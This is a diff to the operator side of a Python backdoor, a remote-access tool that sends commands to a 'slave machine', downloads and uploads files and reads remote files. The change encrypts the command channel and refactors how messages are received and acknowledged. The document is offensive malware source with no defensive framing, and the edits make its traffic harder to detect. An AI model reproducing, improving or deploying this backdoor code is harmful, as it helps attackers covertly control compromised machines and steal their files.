@@ -19,7 +19,9 @@ class Backdoor():
 
     def send_cmd(self, cmd):
         try:
-            self.conn.send(cmd.encode())
+            encoded_cmd = cmd.encode("utf-8")
+            encrypted_cmd = self.crypto.encrypt(encoded_cmd)
+            self.conn.send(encrypted_cmd)
         except socket_error:
             stderr.write("Error sending command\n")
             exit(0)
@@ -35,6 +37,16 @@ class Backdoor():
         else:
             wait()
         exit(0)
+
+    def recv_msg(self, buf):
+        msg = ""
+        try:
+            encrypted_msg = self.conn.recv(buf)
+            encoded_msg = self.crypto.decrypt(encrypted_msg) 
+            msg = encoded_msg.decode("utf-8")
+        except socket_error:
+            stderr.write("[x] Error receiving response\n")
+        return msg
 
     def builtin_cmds(self, cmd):
         msg = ""
@@ -53,8 +65,7 @@ class Backdoor():
             exit(0)
         elif cmd[:2] == "dl":
             self.send_cmd(cmd)
-            encoded_data = self.conn.recv(64000)
-            msg = encoded_data.decode()
+            msg = self.recv_msg(64000)
             with open("dump/"+str(cmd)[3:], "w") as fp:
                 fp.write(msg[3:])
         elif cmd[:2] == "pl":
@@ -65,46 +76,33 @@ class Backdoor():
             filename = input("$ ")
             with open(filename, "r") as fp:
                 data = fp.read()
-                encoded_data = data.encode()
-                self.conn.send(encoded_data)
+                self.send_cmd(data)
             msg = "[+] File uploaded to slave machine"
         elif cmd[:3] == "cat":
             filename = cmd[3:]
-            try:
-                encoded_cmd = cmd.encode()
-                self.conn.send(encoded_cmd)
-            except socket_error:
-                    stderr.write("[x] Error sending command\n")
-            try:
-                encoded_msg = self.conn.recv(64000)
-                msg = encoded_msg.decode()
-            except socket_error:
-                stderr.write("[x] Error receiving message")
+            self.send_cmd(cmd)
+            msg = self.recv_msg(64000)
         else:
             self.send_cmd(cmd)
             return msg
         return msg
 
 
-
-    def display_response(self, msg):
-        if msg == "":
-            try:
-                encoded_msg = self.conn.recv(1024)
-                msg = encoded_msg.decode()
-            except socket_error:
-                stderr.write("[x] Error receiving message")
-            slave_ack = msg[:3]
-            msg = msg[3:]
-            if slave_ack != "ACK":
-                stderr.write("[x] Slave did not acknowledge the command\n")
-            elif msg[:3] == "404":
-                print("Error message from slave: %s" % (msg[3:]))
-            else:
-                print(msg)
+    def validate_msg(self, msg):
+        slave_ack = msg[:3]
+        msg = msg[3:]
+        if slave_ack != "ACK":
+            stderr.write("[x] Slave did not acknowledge the command\n")
+        elif msg[:3] == "404":
+            print("Error message from slave: %s" % (msg[3:]))
         else:
             print(msg)
 
+    def display_response(self, msg):
+        if msg == "":
+            msg = self.recv_msg(1024)
+        self.validate_msg(msg)
+            
     def cmd_shell(self):
         while True:
             cmd = self.get_cmd()
